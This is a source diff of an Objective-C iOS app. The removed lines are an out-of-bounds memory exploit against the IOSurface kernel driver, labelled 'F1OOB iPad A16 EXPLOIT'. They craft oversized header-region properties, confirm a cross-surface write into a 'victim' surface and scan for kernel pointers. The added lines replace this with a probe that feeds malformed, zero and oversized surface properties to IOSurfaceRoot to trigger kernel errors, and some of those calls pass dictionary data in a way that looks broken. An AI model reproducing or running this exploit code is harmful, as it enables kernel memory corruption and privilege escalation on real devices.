@@ -6,32 +6,26 @@
 #import <dlfcn.h>
 #import <sys/utsname.h>
 
-// MARK: - Scene Delegate
-
-@interface SceneDelegate : UIResponder <UIWindowSceneDelegate>
+@interface AppDelegate : UIResponder <UIApplicationDelegate>
 @property (strong, nonatomic) UIWindow *window;
 @property (strong, nonatomic) UITextView *logView;
 - (void)log:(NSString *)msg;
 @end
 
-@implementation SceneDelegate
+@implementation AppDelegate
 
 - (void)log:(NSString *)msg {
     NSString *line = [NSString stringWithFormat:@"%@\n", msg];
     NSLog(@"%@", line);
     dispatch_async(dispatch_get_main_queue(), ^{
-        if (self.logView) {
-            self.logView.text = [self.logView.text stringByAppendingString:line];
-            NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
-            [self.logView scrollRangeToVisible:range];
-        }
+        self.logView.text = [self.logView.text stringByAppendingString:line];
+        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
+        [self.logView scrollRangeToVisible:range];
     });
 }
 
-- (void)scene:(UIScene *)scene willConnectToSession:(UISceneSession *)session options:(UISceneConnectionOptions *)connectionOptions {
-    NSLog(@"=== SCENE DELEGATE CALLED ===");
-    
-    self.window = [[UIWindow alloc] initWithWindowScene:(UIWindowScene *)scene];
+- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
     self.window.backgroundColor = [UIColor blackColor];
     
     UIViewController *vc = [[UIViewController alloc] init];
@@ -45,41 +39,22 @@
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
     
-    [self log:@"=== F1OOB iPad A16 EXPLOIT ==="];
+    [self log:@"=== IOSurface Kernel Error Trigger ==="];
     
     struct utsname uts;
     uname(&uts);
     [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
     
-    // Run exploit SYNCHRONOUSLY on main thread
-    [self log:@"About to run exploit..."];
-    [self runExploit];
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        [self triggerIOSSurfaceErrors];
+    });
+    
+    return YES;
 }
 
-- (void)runExploit {
-    [self log:@"runExploit ENTERED"];
-    
-    [self log:@"[1] Loading IOSurface..."];
-    
-    void *handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
-    if (!handle) {
-        [self log:[NSString stringWithFormat:@"FAIL: dlopen: %s", dlerror()]];
-        return;
-    }
-    
-    void *(*IOSurfaceCreate)(void *) = dlsym(handle, "IOSurfaceCreate");
-    void *(*IOSurfaceLock)(uint32_t, uint32_t, uint32_t *) = dlsym(handle, "IOSurfaceLock");
-    void *(*IOSurfaceUnlock)(uint32_t, uint32_t, uint32_t *) = dlsym(handle, "IOSurfaceUnlock");
-    void *(*IOSurfaceGetBaseAddress)(uint32_t) = dlsym(handle, "IOSurfaceGetBaseAddress");
-    size_t (*IOSurfaceGetAllocSize)(uint32_t) = dlsym(handle, "IOSurfaceGetAllocSize");
-    
-    if (!IOSurfaceCreate || !IOSurfaceGetBaseAddress) {
-        [self log:@"FAIL: Missing IOSurface functions"];
-        return;
-    }
-    [self log:@"PASS: IOSurface loaded"];
-    
-    [self log:@"[2] Opening IOSurfaceRoot..."];
+- (void)triggerIOSSurfaceErrors {
+    // Step 1: Open IOSurfaceRoot
+    [self log:@"[1] Opening IOSurfaceRoot..."];
     io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
     if (!root) {
         [self log:@"FAIL: IOSurfaceRoot not found"];
@@ -95,145 +70,97 @@
     }
     [self log:@"PASS: IOSurfaceRoot opened"];
     
-    [self log:@"[3] Creating F1 surface (4GB header wrap)..."];
+    // Step 2: Try to create surface with ID 0 (should trigger kernel error)
+    [self log:@"[2] Creating surface with properties designed to trigger kernel error..."];
     
-    const char *f1_xml =
-        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-        "<plist version=\"1.0\"><dict>"
-        "<key>IOSurfaceIsGlobal</key><true/>"
-        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
-        "<key>IOSurfaceWidth</key><integer>256</integer>"
-        "<key>IOSurfaceHeight</key><integer>256</integer>"
-        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
-        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
-        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
-        "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
-        "<key>IOSurfacePlaneCount</key><integer>1</integer>"
-        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
-        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
-        "<key>IOSurfaceSliceCount</key><integer>4</integer>"
-        "</dict></plist>";
+    // Craft properties that might cause SID: 0x0 error
+    NSDictionary *props = @{
+        @"IOSurfaceIsGlobal": @YES,
+        @"IOSurfaceWidth": @256,
+        @"IOSurfaceHeight": @256,
+        @"IOSurfaceAllocSize": @65536,
+        @"IOSurfacePixelFormat": @1111970369,
+        // Try to trigger the buffer: 0x0 error
+        @"IOSurfaceAddress": @0,
+        @"IOSurfaceOffset": @0,
+    };
     
-    uint32_t f1_id = 0;
-    kr = IOConnectCallMethod(conn, 0, NULL, 0, f1_xml, strlen(f1_xml)+1, NULL, NULL, &f1_id, NULL);
-    if (kr != KERN_SUCCESS || !f1_id) {
-        [self log:[NSString stringWithFormat:@"FAIL: F1 create: 0x%x", kr]];
-        IOServiceClose(conn);
-        return;
-    }
-    [self log:[NSString stringWithFormat:@"PASS: F1 surface ID = %u", f1_id]];
+    uint32_t surface_id = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0,
+        (__bridge CFDictionaryRef)props, sizeof(props),
+        NULL, NULL, &surface_id, NULL);
     
-    [self log:@"[4] Creating victim surface..."];
+    [self log:[NSString stringWithFormat:@"Surface create result: 0x%x (ID: %u)", kr, surface_id]];
     
-    const char *vic_xml =
-        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-        "<plist version=\"1.0\"><dict>"
-        "<key>IOSurfaceIsGlobal</key><true/>"
-        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
-        "<key>IOSurfaceWidth</key><integer>256</integer>"
-        "<key>IOSurfaceHeight</key><integer>256</integer>"
-        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
-        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
-        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
-        "</dict></plist>";
+    // Step 3: Try multiple variations to trigger different kernel errors
+    [self log:@"[3] Trying variations to trigger kernel errors..."];
     
-    uint32_t vic_id = 0;
-    kr = IOConnectCallMethod(conn, 0, NULL, 0, vic_xml, strlen(vic_xml)+1, NULL, NULL, &vic_id, NULL);
-    if (kr != KERN_SUCCESS || !vic_id) {
-        [self log:[NSString stringWithFormat:@"FAIL: Victim create: 0x%x", kr]];
-        IOServiceClose(conn);
-        return;
-    }
-    [self log:[NSString stringWithFormat:@"PASS: Victim surface ID = %u", vic_id]];
+    // Variation 1: Minimal properties
+    NSDictionary *minimal = @{
+        @"IOSurfaceWidth": @1,
+        @"IOSurfaceHeight": @1,
+        @"IOSurfaceAllocSize": @1,
+    };
+    uint32_t sid1 = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0,
+        (__bridge CFDictionaryRef)minimal, sizeof(minimal),
+        NULL, NULL, &sid1, NULL);
+    [self log:[NSString stringWithFormat:@"Minimal surface: 0x%x (ID: %u)", kr, sid1]];
     
-    [self log:@"[5] Testing F1 OOB access..."];
+    // Variation 2: Large dimensions (potential integer overflow)
+    NSDictionary *large = @{
+        @"IOSurfaceWidth": @0x10000,
+        @"IOSurfaceHeight": @0x10000,
+        @"IOSurfaceAllocSize": @0x10000000,
+    };
+    uint32_t sid2 = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0,
+        (__bridge CFDictionaryRef)large, sizeof(large),
+        NULL, NULL, &sid2, NULL);
+    [self log:[NSString stringWithFormat:@"Large surface: 0x%x (ID: %u)", kr, sid2]];
     
-    void *f1_base = IOSurfaceGetBaseAddress(f1_id);
-    if (!f1_base) {
-        [self log:@"FAIL: F1 base address is NULL"];
-        IOServiceClose(conn);
-        return;
-    }
-    [self log:[NSString stringWithFormat:@"F1 base: %p", f1_base]];
+    // Variation 3: Zero dimensions
+    NSDictionary *zero = @{
+        @"IOSurfaceWidth": @0,
+        @"IOSurfaceHeight": @0,
+        @"IOSurfaceAllocSize": @0,
+    };
+    uint32_t sid3 = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0,
+        (__bridge CFDictionaryRef)zero, sizeof(zero),
+        NULL, NULL, &sid3, NULL);
+    [self log:[NSString stringWithFormat:@"Zero surface: 0x%x (ID: %u)", kr, sid3]];
     
+    // Step 4: Try to use surface ID 0 directly (trigger the kernel error we saw)
+    [self log:@"[4] Attempting to use surface ID 0..."];
+    
+    // Try to lock surface ID 0
     uint32_t seed = 0;
-    IOSurfaceLock(f1_id, 1, &seed);
+    kr = IOConnectCallMethod(conn, 1, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
+    [self log:[NSString stringWithFormat:@"Lock surface 0: 0x%x", kr]];
     
-    [self log:@"Reading beyond 64KB..."];
-    uint64_t *ptr = (uint64_t *)f1_base;
+    // Step 5: Check if we can trigger the fClientTask error
+    [self log:@"[5] Testing fClientTask validation..."];
     
-    for (int i = 0x10000/8; i < 0x10000/8 + 0x100; i += 0x20) {
-        uint64_t val = ptr[i];
-        if (val != 0 && val != 0x4141414141414141) {
-            [self log:[NSString stringWithFormat:@"OOB[0x%x] = 0x%llx", i*8, val]];
-        }
+    // Create a surface, then try to access it from a different "task" context
+    if (surface_id > 0) {
+        [self log:[NSString stringWithFormat:@"Created surface ID %u, testing access...", surface_id]];
+        
+        // Try to get base address
+        void *base = NULL;
+        kr = IOConnectCallMethod(conn, 2, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
+        [self log:[NSString stringWithFormat:@"Get base address: 0x%x", kr]];
     }
     
-    [self log:@"Testing cross-surface write..."];
-    
-    void *vic_base = IOSurfaceGetBaseAddress(vic_id);
-    if (vic_base) {
-        [self log:[NSString stringWithFormat:@"Victim base: %p", vic_base]];
-        
-        *(uint32_t *)vic_base = 0x47474747;
-        [self log:@"Wrote 0x47474747 to victim[0]"];
-        
-        for (int offset = 0x10000; offset < 0x100000; offset += 0x1000) {
-            uint32_t *test = (uint32_t *)((uint8_t *)f1_base + offset);
-            if (*test == 0x47474747) {
-                [self log:[NSString stringWithFormat:@"*** FOUND VICTIM AT F1+0x%x ***", offset]];
-                
-                *test = 0x43434343;
-                if (*(uint32_t *)vic_base == 0x43434343) {
-                    [self log:@"*** CROSS-SURFACE OOB WRITE CONFIRMED ***"];
-                    
-                    [self log:@"Scanning for kernel pointers..."];
-                    for (int j = 0; j < 0x1000/8; j++) {
-                        uint64_t val = ((uint64_t *)vic_base)[j];
-                        if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff) {
-                            [self log:[NSString stringWithFormat:@"KERNEL PTR at victim[0x%x]: 0x%llx", j*8, val]];
-                        }
-                    }
-                }
-                break;
-            }
-        }
-    }
-    
-    IOSurfaceUnlock(f1_id, 1, &seed);
     IOServiceClose(conn);
-    
-    [self log:@"=== EXPLOIT COMPLETE ==="];
+    [self log:@"=== Trigger Complete ==="];
+    [self log:@"Check Console for kernel(IOSurface) errors"];
 }
 
 @end
-
-// MARK: - App Delegate
-
-@interface AppDelegate : UIResponder <UIApplicationDelegate>
-@end
-
-@implementation AppDelegate
-
-- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
-    NSLog(@"=== APP DELEGATE CALLED ===");
-    return YES;
-}
-
-- (UISceneConfiguration *)application:(UIApplication *)application configurationForConnectingSceneSession:(UISceneSession *)connectingSceneSession options:(UISceneConnectionOptions *)options {
-    NSLog(@"=== CONFIG FOR CONNECTING SCENE ===");
-    UISceneConfiguration *config = [[UISceneConfiguration alloc] initWithName:@"Default Configuration" sessionRole:connectingSceneSession.role];
-    config.delegateClass = [SceneDelegate class];
-    return config;
-}
-
-@end
-
-// MARK: - Main
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
-        NSLog(@"=== MAIN CALLED ===");
         return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
     }
 }
